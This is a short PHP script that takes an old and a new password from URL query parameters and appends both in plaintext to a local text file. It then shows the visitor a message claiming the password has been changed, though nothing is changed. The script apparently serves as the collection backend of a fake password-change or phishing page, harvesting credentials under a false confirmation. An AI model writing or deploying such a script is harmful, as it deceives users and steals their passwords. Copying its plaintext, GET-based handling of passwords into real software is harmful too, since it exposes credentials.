<?php
    $Oldpass = $_GET['oldpass'];
    $newpass = $_GET['newpass'];

    $filename = '../data/passchange.txt';
    $fp = fopen($filename, 'a+') or die("Unable to open file!");
    fwrite ($fp, $Oldpass . "," . $newpass . "\n");
   
    echo ("Your Password Has Been Change ");
    

?>